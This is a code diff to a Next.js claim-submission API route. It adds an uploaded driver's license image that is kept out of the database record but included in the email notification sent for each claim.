@@ -2,10 +2,18 @@ import { NextRequest, NextResponse } from "next/server"
 import { addClaim } from "@/lib/db"
 import { sendClaimNotification } from "@/lib/email"
 
+export const config = {
+  api: {
+    bodyParser: {
+      sizeLimit: "15mb",
+    },
+  },
+}
+
 export async function POST(req: NextRequest) {
   try {
     const body = await req.json()
-    const { winnerId, method, uniqueCode, amount } = body
+    const { winnerId, method, uniqueCode, amount, driversLicenseImage } = body
 
     // Validate based on method
     if (method === "cashier_check") {
@@ -26,15 +34,20 @@ export async function POST(req: NextRequest) {
       }
     }
 
+    // Store claim data (exclude large base64 image from DB, keep a flag)
+    const dbData = { ...body }
+    delete dbData.driversLicenseImage
+    dbData.hasDriversLicense = !!driversLicenseImage
+
     const claim = await addClaim({
       winnerId: winnerId || "unknown",
       method: method || "unknown",
       uniqueCode: uniqueCode || "",
       amount: amount || "0",
-      data: body,
+      data: dbData,
     })
 
-    // Send email notification (non-blocking)
+    // Send email notification with DL image (non-blocking)
     sendClaimNotification({
       ...body,
       uniqueCode,
